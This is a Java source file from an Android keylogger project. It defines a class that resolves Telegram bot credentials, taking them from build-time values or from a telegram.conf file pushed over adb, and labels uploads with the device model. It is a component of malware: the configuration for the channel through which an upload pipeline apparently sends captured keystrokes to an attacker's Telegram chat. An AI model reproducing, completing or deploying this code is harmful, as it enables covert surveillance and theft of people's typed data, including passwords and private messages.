package com.bshu2.androidkeylogger;

import android.content.Context;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.Locale;

/**
 * Resolves Telegram credentials. Build-time values injected from the gitignored
 * local.properties win; otherwise an optional telegram.conf pushed over adb is
 * read, so a credential-free release APK still works:
 *
 *   adb push telegram.conf /sdcard/Android/data/com.bshu2.androidkeylogger/files/
 *
 * File format, one key=value per line:
 *   bot_token=123456:AA...
 *   chat_id=987654321
 */
final class TelegramConfig {

    private static final String TAG = UploadPipeline.TAG;
    private static final String CONF_FILE = "telegram.conf";

    private TelegramConfig() {
    }

    static Config load(Context ctx) {
        Config config = new Config();
        config.deviceName = safe(android.os.Build.MODEL);
        config.botToken = BuildConfig.BOT_TOKEN == null ? "" : BuildConfig.BOT_TOKEN.trim();
        config.chatId = BuildConfig.CHAT_ID == null ? "" : BuildConfig.CHAT_ID.trim();
        if (config.isConfigured()) return config; // build-time values win

        File conf = new File(UploadPipeline.logDir(ctx), CONF_FILE);
        if (!conf.isFile()) return config;

        BufferedReader reader = null;
        try {
            reader = new BufferedReader(
                    new InputStreamReader(new FileInputStream(conf), StandardCharsets.UTF_8));
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                int eq = line.indexOf('=');
                if (eq <= 0) continue;
                String key = line.substring(0, eq).trim().toLowerCase(Locale.US);
                String value = line.substring(eq + 1).trim();
                if ("bot_token".equals(key)) config.botToken = value;
                else if ("chat_id".equals(key)) config.chatId = value;
            }
            Log.d(TAG, "loaded " + CONF_FILE + " (token set=" + !config.botToken.isEmpty()
                    + " chat set=" + !config.chatId.isEmpty() + ")");
        } catch (Exception e) {
            Log.e(TAG, "could not read " + CONF_FILE, e);
        } finally {
            try { if (reader != null) reader.close(); } catch (Exception ignored) { }
        }
        return config;
    }

    private static String safe(String s) {
        return (s == null || s.isEmpty()) ? "unknown" : s.replace('|', '/');
    }

    /** Resolved Telegram credentials plus the device label used in captions. */
    static final class Config {
        String botToken;
        String chatId;
        String deviceName;

        boolean isConfigured() {
            return botToken != null && !botToken.isEmpty()
                    && !botToken.equals("YOUR_BOT_TOKEN")
                    && chatId != null && !chatId.isEmpty()
                    && !chatId.equals("YOUR_CHAT_ID");
        }
    }
}
